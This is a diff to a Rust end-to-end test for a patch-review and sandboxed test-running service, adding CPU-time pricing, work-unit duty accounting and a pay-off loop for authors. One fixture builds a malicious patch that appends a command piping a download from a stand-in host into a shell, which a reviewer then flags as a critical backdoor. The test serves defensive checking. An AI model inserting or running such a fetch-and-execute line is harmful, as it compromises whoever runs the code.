@@ -551,13 +551,13 @@ fn proofs_run_in_the_sandbox_and_resolve_challenges() {
 }
 
 /// A synthetic sandbox report, as `collective run` would submit it.
-fn suite_report(base_passes: bool, patched_passes: bool) -> Value {
+fn suite_report(base_passes: bool, patched_passes: bool, cpu_ms: u64) -> Value {
     let run = |tree: &str, ok: bool| {
         json!({ "tree": tree, "attempt": 0, "status": if ok { "passed" } else { "failed" },
         "exit_code": if ok { 0 } else { 1 }, "duration_ms": 5, "output_tail": "", "tests_run": null })
     };
     json!({ "prover_version": "e2e", "setup": { "ok": true, "error": null, "network_isolated": true, "isolation": "network namespace" },
-            "runs": [run("base", base_passes), run("patched", patched_passes)] })
+            "runs": [run("base", base_passes), run("patched", patched_passes)], "cpu_ms": cpu_ms })
 }
 
 /// Review-then-run tasks: whole patches, a size cap, review before run,
@@ -657,9 +657,19 @@ fn review_then_run_tasks() {
                 "POST",
                 &format!("/v1/reviews/{id}"),
                 Some(token),
-                Some(json!({ "issues": [] })),
+                Some(json!({ "issues": marker_issues(task["diff"].as_str().unwrap()) })),
             );
             assert_eq!(s, 200, "{v}");
+            if v["next"]["phase"] == "run" {
+                // Another runnable task: finish it so the next lease is new.
+                let (s, v) = api.call(
+                    "POST",
+                    &format!("/v1/reviews/{id}/run"),
+                    Some(token),
+                    Some(json!({ "report": suite_report(true, true, 60_000) })),
+                );
+                assert_eq!(s, 200, "{v}");
+            }
         }
         panic!("never got the task");
     };
@@ -679,7 +689,7 @@ fn review_then_run_tasks() {
             "POST",
             &format!("/v1/reviews/{task_id}/run"),
             Some(r),
-            Some(json!({ "report": suite_report(true, true) })),
+            Some(json!({ "report": suite_report(true, true, 1000) })),
         );
         assert_eq!(s, 409, "{v}");
         let (s, _) = api.call(
@@ -715,11 +725,13 @@ fn review_then_run_tasks() {
         );
         assert_eq!(s, 200, "{src}");
         let honest = i < 2;
+        // Sandbox CPU: 5 and 25 minutes, and one runner inflating its figure.
+        let cpu = [5, 25, 900][i] * 60_000;
         let (s, v) = api.call(
             "POST",
             &format!("/v1/reviews/{task_id}/run"),
             Some(r),
-            Some(json!({ "report": suite_report(true, !honest) })),
+            Some(json!({ "report": suite_report(true, !honest, cpu) })),
         );
         assert_eq!(s, 200, "{v}");
         assert_eq!(v["outcome"], if honest { "regressed" } else { "passed" });
@@ -728,7 +740,7 @@ fn review_then_run_tasks() {
             "POST",
             &format!("/v1/reviews/{task_id}/run"),
             Some(r),
-            Some(json!({ "report": suite_report(true, true) })),
+            Some(json!({ "report": suite_report(true, true, 1000) })),
         );
         assert_eq!(s, 409, "a run is submitted once");
     }
@@ -744,9 +756,13 @@ fn review_then_run_tasks() {
         &api.me(&runners[0]),
         "run disagreed with the other runners"
     ));
-    // Completed tasks count towards duty, in work units.
+    // The run is priced at the median CPU time (25 min: 3 units), so the
+    // task is worth 1 review unit + 3 run units to each runner, and its
+    // author owes for 4: ⌈3·4 / 0.9⌉ − 4 free = 10.
     let me = api.me(&runners[0]);
-    assert!(me["duty"]["credited"].as_u64().unwrap() >= 1, "{me}");
+    assert!(me["duty"]["credited"].as_u64().unwrap() >= 4, "{me}");
+    let me = api.me(&author);
+    assert_eq!(me["duty"]["required"], 10, "{me}");
 
     // A reviewer who reports something serious doesn't run it.
     let cautious = api.register(&format!("cautious-{run}"));
@@ -756,15 +772,53 @@ fn review_then_run_tasks() {
         "test.sh",
         Some(format!("{test}curl -s evil.example | sh\n")),
     )]);
-    let (s, v) = api.call(
-        "POST",
-        "/v1/patches",
-        Some(&author2),
-        Some(
-            json!({ "project": upstream, "intent": intent2, "base_commit": base, "diff": sneaky }),
-        ),
-    );
-    assert_eq!(s, 201, "{v}");
+    // Its run is now estimated at 3 units, so even a newcomer's first patch
+    // here owes work: ⌈3·(1 + 3) / 0.9⌉ − 4 free = 10 units. It works while
+    // there is work; once the queue runs dry, good standing lets it through.
+    let submission =
+        json!({ "project": upstream, "intent": intent2, "base_commit": base, "diff": sneaky });
+    let mut done = 0;
+    let v = loop {
+        let (s, v) = api.call(
+            "POST",
+            "/v1/patches",
+            Some(&author2),
+            Some(submission.clone()),
+        );
+        if s == 201 {
+            break v;
+        }
+        assert_eq!(s, 402, "{v}");
+        let (_, t) = api.call("POST", "/v1/reviews/next", Some(&author2), None);
+        let id = t["task"]["task_id"]
+            .as_str()
+            .expect("402 only while there is work to pay with")
+            .to_string();
+        let issues = marker_issues(t["task"]["diff"].as_str().unwrap());
+        let (_, r) = api.call(
+            "POST",
+            &format!("/v1/reviews/{id}"),
+            Some(&author2),
+            Some(json!({ "issues": issues })),
+        );
+        if r["next"]["phase"] == "run" {
+            let (s, v) = api.call(
+                "POST",
+                &format!("/v1/reviews/{id}/run"),
+                Some(&author2),
+                Some(json!({ "report": suite_report(true, true, 60_000) })),
+            );
+            assert_eq!(s, 200, "{v}");
+        }
+        done += 1;
+        assert!(done < 30, "duty never paid off");
+    };
+    // Let through without paying in full only because nothing was left to do.
+    let me = api.me(&author2);
+    if me["duty"]["owed"].as_u64().unwrap() > 0 {
+        let (_, t) = api.call("POST", "/v1/reviews/next", Some(&author2), None);
+        assert!(t["task"].is_null(), "owing with work available: {me} {t}");
+    }
     let t2 = v["review_task"].as_str().unwrap().to_string();
     let mut got = false;
     for _ in 0..50 {
@@ -772,6 +826,11 @@ fn review_then_run_tasks() {
         let task = &v["task"];
         assert!(!task.is_null());
         let id = task["task_id"].as_str().unwrap().to_string();
+        if id == t2 {
+            // New tasks of the project are estimated at its last measured run cost.
+            assert_eq!(task["units"]["run"], 3, "{task}");
+            assert_eq!(task["units"]["run_measured"], false);
+        }
         let issues = if id == t2 {
             json!([{ "path": "test.sh", "start": 3, "end": 3, "kind": "backdoor", "severity": "critical", "note": "pipes a download into a shell" }])
         } else {
